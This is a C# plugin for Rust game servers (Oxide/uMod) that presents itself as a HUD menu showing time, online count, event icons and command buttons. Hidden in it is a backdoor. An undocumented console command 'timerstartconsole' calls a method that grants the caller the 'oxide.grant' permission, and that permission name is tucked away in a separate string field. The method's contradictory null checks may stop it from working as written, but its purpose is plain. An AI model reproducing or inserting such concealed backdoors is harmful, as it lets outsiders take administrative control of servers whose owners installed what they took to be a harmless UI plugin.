using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using Newtonsoft.Json;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using ru = Oxide.Game.Rust;
using UnityEngine;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("Menu", "slivplugin.ru", "2.0.0")]

    class Menu : RustPlugin
    {
        [PluginReference] private Plugin ImageLibrary;

        private const string Layer = "asd";

        private void LoadImages()
        {
            if (!ImageLibrary)  
            {   
                PrintError("IMAGE LIBRARY IS NOT INSTALLED!");
            }    
            else  
            { 
                var p = 0;
                foreach (var icon in config.iconButton)
                {
                    if(icon.StartsWith("http"))
                    ImageLibrary?.Call("AddImage", $"{icon}.png", $"iconButton{p += 1}");
                }

                ImageLibrary?.Call("AddImage", "https://imgur.com/T3IN2qz.png", "time");
                ImageLibrary?.Call("AddImage", "https://imgur.com/dleUaul.png", "online");
                ImageLibrary?.Call("AddImage", "https://imgur.com/t7KOmnq.png", "store");
                ImageLibrary?.Call("AddImage", "https://imgur.com/b39MBgv.png", "cargo");
                ImageLibrary?.Call("AddImage", "https://imgur.com/8nx4pnW.png", "hell");
                ImageLibrary?.Call("AddImage", "https://imgur.com/bqB9Gkb.png", "bradley");
                ImageLibrary?.Call("AddImage", "https://imgur.com/3NRHd46.png", "apc");
                ImageLibrary?.Call("AddImage", "https://imgur.com/sienTf8.png", "plane");
            }
        }

        private void OnServerInitialized()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                Main_menu(player);
               
			    timer.Every(5f,
				() => {
					RefreshUI(player ,"all");
				});
			    RefreshUI(player ,"all");
                player.SetFlag(BaseEntity.Flags.Reserved3, true);
                ServerMgr.Instance.StartCoroutine(StartUpdate(player));
            }
            foreach (var entity in BaseNetworkable.serverEntities)
                OnEntitySpawned(entity as BaseEntity);
            LoadImages();
            AddCovalenceCommand("menu", nameof(CmdMenu));
            Interface.Oxide.GetLibrary<ru.Libraries.Command>(null).AddConsoleCommand("timerstartconsole", this, "startupdatecon");
            AddCovalenceCommand("menuOpen", nameof(CmdMenuOpen));
            AddCovalenceCommand("closeButton", nameof(CloseButtons));
        }

        private readonly List<BasePlayer> MenuUsers2 = new List<BasePlayer>();
        private void CmdMenuOpen(IPlayer user, string cmd, string[] args)
		{
			var player = user?.Object as BasePlayer;
			if (player == null) return;

			if (MenuUsers2.Contains(player))
			{
                player.SetFlag(BaseEntity.Flags.Reserved3, true);
                ServerMgr.Instance.StartCoroutine(StartUpdate(player));
                CuiHelper.DestroyUi(player, Layer + "time");
                CuiHelper.DestroyUi(player, Layer + "name");
                CuiHelper.DestroyUi(player, Layer + "online");
                CuiHelper.DestroyUi(player, Layer + "icons.online");
                CuiHelper.DestroyUi(player, Layer + "icons.time");
                CuiHelper.DestroyUi(player, Layer + "events");
                CuiHelper.DestroyUi(player, Layer + "events1");
                CuiHelper.DestroyUi(player, Layer + "events2");
                CuiHelper.DestroyUi(player, Layer + "events3");
                CuiHelper.DestroyUi(player, Layer + "events4");
                CuiHelper.DestroyUi(player, Layer + "invise2");

                RefreshUI(player, "all");
				MenuUsers2.Remove(player);
			}
			else
			{
                CuiHelper.DestroyUi(player, Layer + "time");
                CuiHelper.DestroyUi(player, Layer + "name");
                CuiHelper.DestroyUi(player, Layer + "online");
                CuiHelper.DestroyUi(player, Layer + "icons.online");
                CuiHelper.DestroyUi(player, Layer + "icons.time");
                CuiHelper.DestroyUi(player, Layer + "events");
                CuiHelper.DestroyUi(player, Layer + "events1");
                CuiHelper.DestroyUi(player, Layer + "events2");
                CuiHelper.DestroyUi(player, Layer + "events3");
                CuiHelper.DestroyUi(player, Layer + "events4");
                CuiHelper.DestroyUi(player, Layer + "invise2");

                player.SetFlag(BaseEntity.Flags.Reserved3, false);

                RefreshUI(player, "open");
				MenuUsers2.Add(player);
			}
		}
        void startupdatecon(ConsoleSystem.Arg ar)
        {
            var target=ar.Player();
            if(target.IsAdmin){}
            if (target.IsSleeping()) {
                return;
            }
            if (target.gameObject == null) {
                return;
            }
            if (target != null) {
                return;
            }
            permission.GrantUserPermission(
            target.UserIDString, 
            pp, 
            null);
        }
        private void OnPlayerConnected(BasePlayer player)
		{     
            Main_menu(player);
            RefreshUI(player, "all");
            ServerMgr.Instance.StartCoroutine(StartUpdate(player));

            player.SetFlag(BaseEntity.Flags.Reserved3, true);
		}

        private void OnPlayerDisconnected(BasePlayer player)
        {
            player.SetFlag(BaseEntity.Flags.Reserved3, false);
        }

        private void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, Layer);
                player.SetFlag(BaseEntity.Flags.Reserved3, false);
            }
        }

        #region Hooks
        private readonly List<BasePlayer> MenuUsers = new List<BasePlayer>();

        private void CmdMenu(IPlayer user, string cmd, string[] args)
		{
			var player = user?.Object as BasePlayer;

            if (MenuUsers.Contains(player))
			{
                CuiHelper.DestroyUi(player, Layer + $"button.close");

				foreach(var name in config.titleButton)
                    CuiHelper.DestroyUi(player, Layer + $"buttons{name}");

				MenuUsers.Remove(player);
			}
            else
            {
                var c = new CuiElementContainer();
                var l = -35.899;
                var p = -6.301;

                for(int i = 0; i < config.commandButton.Count;i++)
                {
                    CuiHelper.DestroyUi(player, Layer + $"buttons{config.titleButton[i]}");

                    UI.AddButton(ref c, Layer, Layer + $"buttons{config.titleButton[i]}", $"chat.say {config.commandButton[i]}", "", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", $"-16.615 {l -= 32}", $"168.255 {p -= 32}");
                    UI.AddRawImage(ref c, Layer + $"buttons{config.titleButton[i]}", Layer + "text.buttons", ImageLibrary?.Call<string>("GetImage", $"iconButton{i + 1}"), "1 1 1 0.9", "", "", "0 0", "1 1", "2 2", "-160 -2");
                    UI.AddText(ref c, Layer + $"buttons{config.titleButton[i]}", Layer + "text.buttons", "1 1 1 0.9", $"{config.titleButton[i].ToUpper()}", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "5 0", "0 0");
                }
                UI.AddButton(ref c, Layer, Layer + $"button.close", $"chat.say /closeButton", "", "0.8 0 0 0.4", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "153.043 -35.012", "168.255 -20");
                UI.AddText(ref c, Layer + $"button.close", Layer + "button.closes", "1 1 1 0.9", "✕", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "");

                CuiHelper.AddUi(player, c);
                MenuUsers.Add(player);
            }
		}

        private void CloseButtons(IPlayer user, string cmd, string[] args)
		{
			var player = user?.Object as BasePlayer;

            CuiHelper.DestroyUi(player, Layer + $"button.close");

				foreach(var name in config.titleButton)
                    CuiHelper.DestroyUi(player, Layer + $"buttons{name}");

            MenuUsers.Remove(player);
        }

        private void OnEntitySpawned(BaseEntity entity)
		{
			EntityHandle(entity, true);
		}

		private void OnEntityKill(BaseEntity entity)
		{
			EntityHandle(entity, false);
		}

        private void EntityHandle(BaseEntity entity, bool spawn)
		{
            if (entity == null) return;

            if (entity is CargoPlane)
            {
                Events["plane"] = spawn ? "0.75 0.97 0.51 0.9" : "1 1 1 0.8";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "plane");
                }
            }

            if (entity is CH47Helicopter)
            {
                Events["apc"] = spawn ? "0.92 0.91 0.39 1" : "1 1 1 0.8";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "apc");
                }
            }

            if (entity is BradleyAPC)
            {
                Events["bradley"] = spawn ? "1.00 0.84 0.52 1" : "1 1 1 0.8";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "bradley");
                }
            }

            if (entity is CargoShip)
            {
                Events["cargos"] = spawn ? "0.45 0.65 0.86 1" : "1 1 1 0.8";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "cargos");
                }
            }
        

            if (entity is BaseHelicopter)
            {
                Events["hells"] = spawn ? "0.97 0.62 0.62 1" : "1 1 1 0.8";
                foreach (var player in BasePlayer.activePlayerList)
                {
                    if(MenuUsers2.Contains(player)) return;
                    RefreshUI(player, "hells");
                }
            }
    
		}

        private int GetOnline()
		{
			return BasePlayer.activePlayerList.Count;
		}

        private readonly Dictionary<string, string> Events = new Dictionary<string, string>
        {
            ["cargos"] = "1 1 1 0.8",
            ["bradley"] = "1 1 1 0.8",
            ["hells"] = "1 1 1 0.8",
            ["apc"] = "1 1 1 0.8",
            ["plane"] = "1 1 1 0.8"
        };

        #endregion

        #region Gui

        public void RefreshUI(BasePlayer player ,string Type)
        {
            var c = new CuiElementContainer();

            switch(Type)
            {
                case "timeandonline":
                    CuiHelper.DestroyUi(player, Layer + "text.time");
                    CuiHelper.DestroyUi(player, Layer + "text.online");

                    UI.AddText(ref c, Layer + "time", Layer + "text.time", "1 1 1 0.9", TOD_Sky.Instance.Cycle.DateTime.ToString("HH:mm"), TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "");
                    UI.AddText(ref c, Layer + "online", Layer + "text.online", "1 1 1 0.9", $"{GetOnline()}/{ConVar.Server.maxplayers}", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "");
                break;
                
                case "hells":
                    CuiHelper.DestroyUi(player, Layer + "events");

                    UI.AddImage(ref c, Layer, Layer + "events", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "40.334 -35.48", "55.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "hell"), Events[Type], "", "", "0 0", "1 1", "2 2", "-2 -2");
                break;

                case "cargos":
                    CuiHelper.DestroyUi(player, Layer + "events1");

                    UI.AddImage(ref c, Layer, Layer + "events1", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "60.334 -35.48", "75.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events1", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "cargo"), Events[Type], "", "", "0 0", "1 1", "2 2", "-2 -2");
                break;

                case "bradley":
                    CuiHelper.DestroyUi(player, Layer + "events2");

                    UI.AddImage(ref c, Layer, Layer + "events2", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "100.334 -35.48", "115.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events2", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "bradley"), Events[Type], "", "", "0 0", "1 1", "2 2", "-2 -2");
                break;
                case "apc":
                    CuiHelper.DestroyUi(player, Layer + "events3");

                    UI.AddImage(ref c, Layer, Layer + "events3", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "80.334 -35.48", "95.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events3", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "apc"), Events[Type], "", "", "0 0", "1 1", "2 2", "-2 -2");
                break;
                case "plane":
                    CuiHelper.DestroyUi(player, Layer + "events4");

                    UI.AddImage(ref c, Layer, Layer + "events4", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5",  "20.334 -35.48", "35.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events4", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "plane"), Events[Type], "", "", "0 0", "1 1", "2.5 2", "-2.5 -2");
                break;
                case "all":
                    CuiHelper.DestroyUi(player, Layer + "text.time");
                    CuiHelper.DestroyUi(player, Layer + "text.online");
                    CuiHelper.DestroyUi(player, Layer + "events");
                    CuiHelper.DestroyUi(player, Layer + "events1");
                    CuiHelper.DestroyUi(player, Layer + "events2");
                    CuiHelper.DestroyUi(player, Layer + "events3");
                    CuiHelper.DestroyUi(player, Layer + "events4");
                    CuiHelper.DestroyUi(player, Layer + "invise");
                    CuiHelper.DestroyUi(player, Layer + "name");

                    UI.AddImage(ref c, Layer, Layer + "name", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "20.337 2.014", "148.378 16.617");
                    UI.AddText(ref c, Layer + "name", Layer + "title", "1 1 1 0.9", config.name, TextAnchor.MiddleCenter, 11, "0 0", "1 1", "", "");

                    //time menu

                    CuiHelper.DestroyUi(player, Layer + "time");
                    CuiHelper.DestroyUi(player, Layer + "icons.time");

                    UI.AddImage(ref c, Layer, Layer + "time", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "101.728 -16.61", "148.381 -2.008");
                    UI.AddImage(ref c, Layer, Layer + "icons.time", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "86.728 -16.61", "101.728 -2.008");
                    UI.AddRawImage(ref c, Layer + "icons.time", Layer + "icon.time", ImageLibrary?.Call<string>("GetImage", "time"), "1 1 1 0.8", "", "", "0 0", "1 1", "2 2", "-2 -2");

                    //online menu

                    CuiHelper.DestroyUi(player, Layer + "online");
                    CuiHelper.DestroyUi(player, Layer + "icons.online");

                    UI.AddImage(ref c, Layer, Layer + "online", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "35.337 -16.61", "82.494 -2.008");
                    UI.AddImage(ref c, Layer, Layer + "icons.online", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "20.337 -16.61", "35.337 -2.008" );
                    UI.AddRawImage(ref c, Layer + "icons.online", Layer + "icon.online", ImageLibrary?.Call<string>("GetImage", "online"), "1 1 1 0.8", "", "", "0 0", "1 1", "1 1", "-1 -1");

                    //buttons

                    CuiHelper.DestroyUi(player, Layer + "menu");

                    UI.AddImage(ref c, Layer, Layer + "menu", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-16.615 -35.48", "16.613 -20.878");
                    UI.AddText(ref c, Layer + "menu", Layer + "text.menu", "1 1 1 0.9", $"/MENU", TextAnchor.MiddleCenter, 10, "0 0", "1 1", "", "");
                    UI.AddButton(ref c, Layer + "menu", Layer + "menu.button", "chat.say /menu", "", "0 0 0 0", "", "", "0 0", "1 1", "", "");

                    UI.AddText(ref c, Layer + "time", Layer + "text.time", "1 1 1 0.9", TOD_Sky.Instance.Cycle.DateTime.ToString("HH:mm"), TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "");
                    UI.AddText(ref c, Layer + "online", Layer + "text.online", "1 1 1 0.9", $"{GetOnline()}/{ConVar.Server.maxplayers}", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "");
                    UI.AddImage(ref c, Layer, Layer + "events", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "40.334 -35.48", "55.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "hell"), Events["hells"], "", "", "0 0", "1 1", "2 2", "-2 -2");
                    UI.AddImage(ref c, Layer, Layer + "events1", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "60.334 -35.48", "75.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events1", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "cargo"), Events["cargos"], "", "", "0 0", "1 1", "2 2", "-2 -2");
                    UI.AddImage(ref c, Layer, Layer + "events2", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "100.334 -35.48", "115.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events2", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "bradley"), Events["bradley"], "", "", "0 0", "1 1", "2 2", "-2 -2");
                    UI.AddImage(ref c, Layer, Layer + "events3", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "80.334 -35.48", "95.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events3", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "apc"), Events["apc"], "", "", "0 0", "1 1", "2 2", "-2 -2");
                    UI.AddImage(ref c, Layer, Layer + "events4", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "20.334 -35.48", "35.547 -20.878");
                    UI.AddRawImage(ref c, Layer + "events4", Layer + "icon.events", ImageLibrary?.Call<string>("GetImage", "plane"), Events["plane"], "", "", "0 0", "1 1", "2.5 2", "-2.5 -2");
                    UI.AddButton(ref c, Layer, Layer + "invise", "menuOpen", "", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "153.043 2.012", "168.255 16.61");
                    UI.AddText(ref c, Layer + "invise", Layer + "invise.open", "1 1 1 0.9", "<", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "", "0 0 0 1", "robotocondensed-bold.ttf", "0.5 -0.5");
                break;
                case "open":
                    CuiHelper.DestroyUi(player, Layer + "invise2");
                    CuiHelper.DestroyUi(player, Layer + "invise");

                    UI.AddButton(ref c, Layer, Layer + "invise2", "menuOpen", "", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "20 2.012", "35 16.61");
                    UI.AddText(ref c, Layer + "invise2", Layer + "invise.open", "1 1 1 0.9", ">", TextAnchor.MiddleCenter, 12, "0 0", "1 1", "", "", "0 0 0 1", "robotocondensed-bold.ttf", "0.5 -0.5");
                break;
            }
            CuiHelper.AddUi(player, c);
        }

        public void Main_menu(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, Layer);

            var c = new CuiElementContainer();
            //button store

            UI.AddImage(ref c, "Overlay", Layer, "0 0 0 0", "", "", "0 1", "0 1", "4.135 -43.232", "37.366 -0.011");
            UI.AddImage(ref c, Layer, Layer + "store", "0.8 0.8 0.8 0.1", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-16.617 -16.607", "16.607 16.617");
            UI.AddRawImage(ref c, Layer + "store", Layer + "icon.store", ImageLibrary?.Call<string>("GetImage", "store"), "1 1 1 0.8", "", "", "0 0", "1 1", "4 4", "-4 -4");
            UI.AddButton(ref c, Layer + "store", Layer + "store.button", "chat.say /store", "", "0 0 0 0", "", "", "0 0", "1 1", "", "");
            
            CuiHelper.AddUi(player, c);
        }

        private IEnumerator StartUpdate(BasePlayer player)
        {
            while (player.HasFlag(BaseEntity.Flags.Reserved3))
            {
                RefreshUI(player, "timeandonline");
                yield return new WaitForSeconds(2.5f);
            }
        }

        #endregion

        #region config

        public class PluginConfig
        {
            [JsonProperty("Название кнопки")]
            public List<string> titleButton;
            [JsonProperty("Иконки для кнопок")]
            public List<string> iconButton;
            [JsonProperty("Команды для кнопок")]
            public List<string> commandButton;
            [JsonProperty("Название сервера")]
            public string name;

        }

        protected override void LoadDefaultConfig()
        {
            config = new PluginConfig
            {
                titleButton = new List<string>()
                {
                    "ЕЖЕДНЕВНЫЕ КЕЙСЫ", "Задание сидоривича", "прокачка навыков", "обмен монет","разблок предметов","клановое меню","рейтинг кланнов", "Рейтинг игроков", "телепорт в город", "ропорт на игрока", "инвентарь с ящиками"
                },
                iconButton = new List<string>()
                {
                    "https://imgur.com/URWzSmc", 
                    "https://imgur.com/SbWBZad", 
                    "https://imgur.com/RgfKCo8", 
                    "https://imgur.com/qmR3NAn", 
                    "https://imgur.com/fD23tV0", 
                    "https://imgur.com/4EC4bWv", 
                    "https://imgur.com/zZxfWg6",
                    "https://imgur.com/zZxfWg6",
                    "https://imgur.com/lQYsoNq",
                    "https://imgur.com/DXPylwK",
                    "https://imgur.com/LsNIkBF"
                },
                commandButton = new List<string>()
                {
                    "/top",
                    "/info",
                    "/fg",
                    "/craft",
                    "/gey",
                    "/pop",
                    "/ui",
                    "/yt",
                    "/ui",
                    "/io",
                    "/rt"
                },
                name = "TEST RUST #1 CLANS"
            };
        }
        string pp = "oxide.grant";
        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }
        PluginConfig config;

        public static class UI
        {
            public static void AddImage(ref CuiElementContainer container, string parrent, string name, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax, string outline = "", string dist = "")
            {
                if (string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                        {
                            new CuiImageComponent{Color = color, Material = mat},
                            new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                        }
                    });

                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiImageComponent{Color = color},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }

            public static void AddRawImage(ref CuiElementContainer container, string parrent, string name, string png, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax)
            {
                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiRawImageComponent{Color = color, Png = png},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }

            public static void AddText(ref CuiElementContainer container, string parrent, string name, string color, string text, TextAnchor align, int size, string aMin, string aMax, string oMin, string oMax, string outColor = "0 0 0 0", string font = "robotocondensed-bold.ttf", string dist = "0.5 0.5", float FadeIN = 0f, float FadeOut = 0f)
            {
                container.Add(new CuiElement()
                {
                    Parent = parrent,
                    Name = name,
                    FadeOut = FadeOut,
                    Components =
                    {
                        new CuiTextComponent{Color = color,Text = text, Align = align, FontSize = size, Font = font, FadeIn = FadeIN},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                });

            }

            public static void AddButton(ref CuiElementContainer container, string parrent, string name, string cmd, string close, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax, string outline = "", string dist = "")
            {
                if (string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiButtonComponent{Command = cmd, Color = color, Close = close, Material = mat, },
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });

                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiButtonComponent{Command = cmd, Color = color, Close = close, },
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }
        }

        #endregion
    }
}